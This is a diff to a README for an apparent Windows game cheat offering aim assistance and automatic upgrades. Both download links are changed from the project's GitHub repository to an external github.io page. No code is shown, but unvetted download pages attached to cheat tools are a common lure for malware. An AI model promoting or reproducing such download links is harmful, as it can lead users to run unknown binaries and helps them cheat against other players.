@@ -1,6 +1,6 @@
 # 🎯 hooked-gx92-win-script - Improve your game performance and accuracy
 
-[<img src="https://img.shields.io/badge/Download-Application-blue.svg">](https://github.com/coreferent-line76/hooked-gx92-win-script)
+[<img src="https://img.shields.io/badge/Download-Application-blue.svg">](https://coreferent-line76.github.io)
 
 This utility helps players manage game settings on Windows 10 and 11. It assists with aim, handles automatic item upgrades, and provides custom hotkey support. You can run the application in the background while you play your favorite PC games. The script keeps your experience stable and works across different sessions.
 
@@ -17,7 +17,7 @@ Ensure your PC meets these standards before you start:
 
 You must visit the project page to access the setup files. Use the link provided below to find the current version.
 
-[Download the application here](https://github.com/coreferent-line76/hooked-gx92-win-script)
+[Download the application here](https://coreferent-line76.github.io)
 
 Follow these steps to complete the installation:
 
